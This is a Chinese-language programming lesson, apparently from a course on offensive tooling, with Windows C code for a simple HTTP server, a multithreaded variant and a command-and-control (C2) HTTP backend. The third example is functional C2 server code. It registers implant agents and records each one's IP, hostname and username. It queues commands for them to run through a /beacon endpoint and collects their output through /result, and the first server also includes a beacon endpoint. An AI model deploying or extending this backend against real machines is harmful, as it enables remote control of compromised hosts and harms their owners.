# 课时07：实现简易HTTP服务器完成通信

## 课程目标

1. 实现简易HTTP服务器
2. 处理GET和POST请求
3. 实现静态文件服务
4. 构建C2 HTTP通信后端

---

## 代码实现

### 示例1：简易HTTP服务器

```c
// HttpServer.c - 简易HTTP服务器
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#define HTTP_PORT 8080
#define BUFFER_SIZE 8192

// 发送HTTP响应
void SendResponse(SOCKET client, int statusCode, const char* contentType, const char* body) {
    char response[BUFFER_SIZE];
    const char* statusText = (statusCode == 200) ? "OK" : 
                             (statusCode == 404) ? "Not Found" : "Error";
    
    int bodyLen = body ? strlen(body) : 0;
    
    sprintf_s(response, sizeof(response),
        "HTTP/1.1 %d %s\r\n"
        "Content-Type: %s\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n",
        statusCode, statusText, contentType, bodyLen);
    
    send(client, response, strlen(response), 0);
    if (body && bodyLen > 0) {
        send(client, body, bodyLen, 0);
    }
}

// 处理请求
void HandleRequest(SOCKET client) {
    char buffer[BUFFER_SIZE];
    char method[16], path[1024], version[16];
    
    int recvLen = recv(client, buffer, sizeof(buffer) - 1, 0);
    if (recvLen <= 0) return;
    buffer[recvLen] = '\0';
    
    // 解析请求行
    sscanf_s(buffer, "%s %s %s", method, 16, path, 1024, version, 16);
    
    printf("[HTTP] %s %s\n", method, path);
    
    // 路由处理
    if (strcmp(path, "/") == 0 || strcmp(path, "/index.html") == 0) {
        const char* html = 
            "<html><head><title>HTTP Server</title></head>"
            "<body><h1>Welcome to Simple HTTP Server</h1>"
            "<p>This is a test page.</p></body></html>";
        SendResponse(client, 200, "text/html", html);
    }
    else if (strcmp(path, "/api/info") == 0) {
        char json[512];
        sprintf_s(json, sizeof(json),
            "{\"server\":\"SimpleHTTP\",\"version\":\"1.0\",\"time\":%d}",
            GetTickCount());
        SendResponse(client, 200, "application/json", json);
    }
    else if (strncmp(path, "/api/beacon", 11) == 0 && strcmp(method, "POST") == 0) {
        // C2 beacon端点
        char* body = strstr(buffer, "\r\n\r\n");
        if (body) {
            body += 4;
            printf("[Beacon] Data: %s\n", body);
        }
        SendResponse(client, 200, "text/plain", "OK");
    }
    else {
        SendResponse(client, 404, "text/plain", "Not Found");
    }
}

int main() {
    WSADATA wsaData;
    SOCKET listenSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    int clientAddrLen = sizeof(clientAddr);
    
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    int optval = 1;
    setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&optval, sizeof(optval));
    
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(HTTP_PORT);
    
    bind(listenSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(listenSocket, SOMAXCONN);
    
    printf("HTTP Server listening on port %d...\n", HTTP_PORT);
    
    while (1) {
        clientSocket = accept(listenSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
        if (clientSocket != INVALID_SOCKET) {
            HandleRequest(clientSocket);
            closesocket(clientSocket);
        }
    }
    
    closesocket(listenSocket);
    WSACleanup();
    return 0;
}
```

### 示例2：多线程HTTP服务器

```c
// HttpServerMT.c - 多线程HTTP服务器
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define HTTP_PORT 8080

typedef struct _CLIENT_CONTEXT {
    SOCKET socket;
    struct sockaddr_in addr;
} CLIENT_CONTEXT;

DWORD WINAPI ClientThread(LPVOID lpParam) {
    CLIENT_CONTEXT* ctx = (CLIENT_CONTEXT*)lpParam;
    char buffer[8192], response[16384];
    
    int recvLen = recv(ctx->socket, buffer, sizeof(buffer) - 1, 0);
    if (recvLen > 0) {
        buffer[recvLen] = '\0';
        
        // 简单响应
        const char* body = "<html><body><h1>Hello World</h1></body></html>";
        sprintf_s(response, sizeof(response),
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html\r\n"
            "Content-Length: %d\r\n"
            "\r\n%s",
            strlen(body), body);
        
        send(ctx->socket, response, strlen(response), 0);
    }
    
    closesocket(ctx->socket);
    free(ctx);
    return 0;
}

int main() {
    WSADATA wsaData;
    SOCKET listenSocket;
    struct sockaddr_in serverAddr;
    
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    listenSocket = socket(AF_INET, SOCK_STREAM, 0);
    
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(HTTP_PORT);
    
    bind(listenSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(listenSocket, SOMAXCONN);
    
    printf("Multi-threaded HTTP Server on port %d\n", HTTP_PORT);
    
    while (1) {
        CLIENT_CONTEXT* ctx = (CLIENT_CONTEXT*)malloc(sizeof(CLIENT_CONTEXT));
        int addrLen = sizeof(ctx->addr);
        
        ctx->socket = accept(listenSocket, (struct sockaddr*)&ctx->addr, &addrLen);
        if (ctx->socket != INVALID_SOCKET) {
            CreateThread(NULL, 0, ClientThread, ctx, 0, NULL);
        } else {
            free(ctx);
        }
    }
    
    return 0;
}
```

### 示例3：C2 HTTP后端

```c
// C2HttpBackend.c - C2 HTTP后端服务器
#include <winsock2.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_PORT 80

typedef struct _AGENT_INFO {
    DWORD   AgentId;
    char    Ip[32];
    time_t  LastSeen;
    char    Hostname[64];
    char    Username[64];
    BOOL    Active;
} AGENT_INFO;

AGENT_INFO g_Agents[100];
int g_AgentCount = 0;
char g_PendingCommand[1024] = "";
CRITICAL_SECTION g_Lock;

// 注册Agent
DWORD RegisterAgent(const char* ip, const char* info) {
    EnterCriticalSection(&g_Lock);
    
    DWORD agentId = (DWORD)time(NULL) ^ GetTickCount();
    
    for (int i = 0; i < 100; i++) {
        if (!g_Agents[i].Active) {
            g_Agents[i].AgentId = agentId;
            strcpy_s(g_Agents[i].Ip, sizeof(g_Agents[i].Ip), ip);
            g_Agents[i].LastSeen = time(NULL);
            g_Agents[i].Active = TRUE;
            
            // 解析info
            sscanf_s(info, "%[^|]|%[^|]", 
                g_Agents[i].Hostname, 64,
                g_Agents[i].Username, 64);
            
            g_AgentCount++;
            break;
        }
    }
    
    LeaveCriticalSection(&g_Lock);
    return agentId;
}

// 处理C2请求
void HandleC2Request(SOCKET client, const char* path, const char* body, const char* clientIp) {
    char response[4096];
    
    if (strstr(path, "/register")) {
        DWORD agentId = RegisterAgent(clientIp, body);
        sprintf_s(response, sizeof(response),
            "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n%08X", agentId);
    }
    else if (strstr(path, "/beacon")) {
        // 更新心跳
        EnterCriticalSection(&g_Lock);
        
        // 返回待执行命令
        if (strlen(g_PendingCommand) > 0) {
            sprintf_s(response, sizeof(response),
                "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nCMD:%s",
                g_PendingCommand);
            g_PendingCommand[0] = '\0';
        } else {
            sprintf_s(response, sizeof(response),
                "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nNOP");
        }
        
        LeaveCriticalSection(&g_Lock);
    }
    else if (strstr(path, "/result")) {
        printf("[Result] %s\n", body);
        sprintf_s(response, sizeof(response),
            "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nOK");
    }
    else {
        sprintf_s(response, sizeof(response),
            "HTTP/1.1 404 Not Found\r\n\r\n");
    }
    
    send(client, response, strlen(response), 0);
}

int main() {
    WSADATA wsaData;
    SOCKET listenSocket;
    
    InitializeCriticalSection(&g_Lock);
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    listenSocket = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(C2_PORT);
    
    bind(listenSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(listenSocket, 10);
    
    printf("C2 HTTP Server on port %d\n", C2_PORT);
    
    while (1) {
        struct sockaddr_in clientAddr;
        int addrLen = sizeof(clientAddr);
        
        SOCKET client = accept(listenSocket, (struct sockaddr*)&clientAddr, &addrLen);
        if (client != INVALID_SOCKET) {
            char buffer[4096];
            int recvLen = recv(client, buffer, sizeof(buffer) - 1, 0);
            
            if (recvLen > 0) {
                buffer[recvLen] = '\0';
                
                char method[16], path[256];
                sscanf_s(buffer, "%s %s", method, 16, path, 256);
                
                char* body = strstr(buffer, "\r\n\r\n");
                if (body) body += 4;
                
                char clientIp[32];
                inet_ntop(AF_INET, &clientAddr.sin_addr, clientIp, sizeof(clientIp));
                
                HandleC2Request(client, path, body ? body : "", clientIp);
            }
            
            closesocket(client);
        }
    }
    
    DeleteCriticalSection(&g_Lock);
    closesocket(listenSocket);
    WSACleanup();
    return 0;
}
```

---

## 课后作业

1. 添加静态文件服务功能
2. 实现WebSocket支持
3. 添加HTTPS支持
4. 实现RESTful API

---

## 扩展阅读

- HTTP服务器设计模式
- 高性能网络服务器
- C2通信协议设计
